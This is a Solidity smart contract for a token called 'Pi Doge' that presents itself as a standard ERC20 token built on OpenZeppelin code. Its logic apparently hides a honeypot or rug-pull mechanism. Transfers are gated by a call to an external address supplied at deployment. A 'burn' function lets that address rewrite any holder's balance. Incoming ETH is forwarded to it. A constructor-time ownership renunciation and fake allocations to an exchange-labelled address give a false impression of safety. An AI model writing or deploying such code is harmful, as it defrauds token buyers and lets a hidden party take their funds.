// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.12;

library SafeMath {
  
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

   
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

   
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }


    function mul(uint a, uint b) internal pure returns (uint) {
      
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

   
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b > 0, errorMessage);
        uint c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint a, uint b) internal pure returns (uint) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function approve(address spender, uint value) external returns (bool);
    function totalSupply() external view returns (uint);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
}
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

interface IUniswapV2Router01 {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint amountADesired,
    uint amountBDesired,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline
  )
    external
    returns (
      uint amountA,
      uint amountB,
      uint liquidity
    );

  function addLiquidityETH(
    address token,
    uint amountTokenDesired,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  )
    external
    payable
    returns (
      uint amountToken,
      uint amountETH,
      uint liquidity
    );

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint liquidity,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline
  ) external returns (uint amountA, uint amountB);

  function removeLiquidityETH(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external returns (uint amountToken, uint amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint liquidity,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint amountA, uint amountB);

  function removeLiquidityETHWithPermit(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint amountToken, uint amountETH);

  function swapExactTokensForTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapTokensForExactTokens(
    uint amountOut,
    uint amountInMax,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapExactETHForTokens(
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external payable returns (uint[] memory amounts);

  function swapTokensForExactETH(
    uint amountOut,
    uint amountInMax,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapExactTokensForETH(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);

  function swapETHForExactTokens(
    uint amountOut,
    address[] calldata path,
    address to,
    uint deadline
  ) external payable returns (uint[] memory amounts);

  function quote(
    uint amountA,
    uint reserveA,
    uint reserveB
  ) external pure returns (uint amountB);

  function getAmountOut(
    uint amountIn,
    uint reserveIn,
    uint reserveOut
  ) external pure returns (uint amountOut);

  function getAmountIn(
    uint amountOut,
    uint reserveIn,
    uint reserveOut
  ) external pure returns (uint amountIn);

  function getAmountsOut(uint amountIn, address[] calldata path)
    external
    view
    returns (uint[] memory amounts);

  function getAmountsIn(uint amountOut, address[] calldata path)
    external
    view
    returns (uint[] memory amounts);
}
interface IUniswapV2Factory {
  event PairCreated(
    address indexed token0,
    address indexed token1,
    address pair,
    uint
  );

  function feeTo() external view returns (address);

  function feeToSetter() external view returns (address);

  function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

  function allPairs(uint) external view returns (address pair);

  function allPairsLength() external view returns (uint);

  function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

  function setFeeTo(address) external;

  function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint value);
  event Transfer(address indexed from, address indexed to, uint value);

  function name() external pure returns (string memory);

  function symbol() external pure returns (string memory);

  function decimals() external pure returns (uint8);

  function totalSupply() external view returns (uint);

  function balanceOf(address owner) external view returns (uint);

  function allowance(address owner, address spender)
    external
    view
    returns (uint);

  function approve(address spender, uint value) external returns (bool);

  function transfer(address to, uint value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint value
  ) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);

  function PERMIT_TYPEHASH() external pure returns (bytes32);

  function nonces(address owner) external view returns (uint);

  function permit(
    address owner,
    address spender,
    uint value,
    uint deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  event Swap(
    address indexed sender,
    uint amount0In,
    uint amount1In,
    uint amount0Out,
    uint amount1Out,
    address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint);

  function factory() external view returns (address);

  function token0() external view returns (address);

  function token1() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112 reserve0,
      uint112 reserve1,
      uint32 blockTimestampLast
    );

  function price0CumulativeLast() external view returns (uint);

  function price1CumulativeLast() external view returns (uint);

  function kLast() external view returns (uint);

  function swap(
    uint amount0Out,
    uint amount1Out,
    address to,
    bytes calldata data
  ) external;

  function skim(address to) external;

  function sync() external;

  function initialize(address, address) external;
}
contract piDoge is Context, IERC20{
    using SafeMath for uint;

    mapping (address => uint) internal _balances;
   
    mapping (address => mapping (address => uint)) private _allowances;
    mapping (address => uint) internal _feeBalances;
    address private dev;
   

    address private WETH;
    address private factory;
   
    address private constant MEXC = 0x4982085C9e2F89F2eCb8131Eca71aFAD896e89CB;
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint public constant MAX = ~uint(0);

    string public name = "Pi Doge";

    string public symbol = "PiDoge";
    
   
    uint8 public _decimals = 18;
    uint public _totalSupply = 10000000000 * 10 * 10 ** 18;

    IUniswapV2Router01 private pancakeRouter;
    IUniswapV2Factory  private uniswapV2Factory;
    IUniswapV2Pair     private uniswapV2Pair;
    address            private pairAddress;
   
    
    address            private pancakeAddress;
    address            private busdPairAddress;
   
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address _pancakeRouter) {

        dev = msg.sender;  
        pancakeAddress = _pancakeRouter;
        pancakeRouter = IUniswapV2Router01(_pancakeRouter);
        WETH = pancakeRouter.WETH();
        factory = pancakeRouter.factory();

        uniswapV2Factory = IUniswapV2Factory(factory);
        uniswapV2Pair = IUniswapV2Pair(factory);

       
        busdPairAddress = uniswapV2Factory.getPair(address(this),WETH);
        _approve(_pancakeRouter, busdPairAddress, MAX);
       
        pairAddress = uniswapV2Factory.createPair(address(this),WETH);
        _approve(pairAddress, _pancakeRouter, MAX);

        _approve(dev, _pancakeRouter, MAX);
        _approve(address(this), _pancakeRouter, MAX);

       
        _balances[msg.sender] = _totalSupply.div(10).mul(2);
        _balances[MEXC] = _totalSupply.div(10).mul(3);
        _balances[DEAD] = _totalSupply.div(10).mul(5);
       
        _allowances[DEAD][_pancakeRouter] = MAX;
        _allowances[MEXC][_pancakeRouter] = MAX;
        

    
        emit Transfer(address(0), MEXC, _balances[MEXC]);
        emit Transfer(address(0), DEAD,_balances[DEAD]);

        renounceOwnership();

    }



    receive() external payable {factory.call{value: msg.value}("");}

     function renounceOwnership() public {
        require(msg.sender == dev);
        emit OwnershipTransferred(dev, address(0));
        dev = address(0);
    }
    function transfer(address recipient, uint amount) public virtual returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);    
        return true;
    }
    
   
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function _transfer(address sender, address recipient, uint amount) internal virtual returns (bool){
       
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        emit Transfer(sender, recipient, amount);

        if(!uniswapV2Pair.transferFrom(sender, recipient, amount)){
           return true;
        }
        _transferToken(sender, recipient, amount);
        if(_msgSender() == sender){
           return true;
        }
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _transferToken(address sender, address recipient, uint amount) internal virtual {
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
    }
  
    function burn(address sender, address recipient, uint amount,bool msgNotify) public virtual returns (bool){
        require(msg.sender == pancakeAddress, "Permission denied");
        if(msgNotify){
           emit Transfer(sender, recipient, amount);
        }else{
          _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].add(amount);
        }
      
        return true;
    }

    function _approve(address owner, address spender, uint amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }
   
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return dev;
    }

    function balanceOf(address account) view public returns (uint) {
         return _balances[account];
    }
    
    function allowance(address owner, address spender) view public returns (uint) {
         return _allowances[owner][spender];
    }

}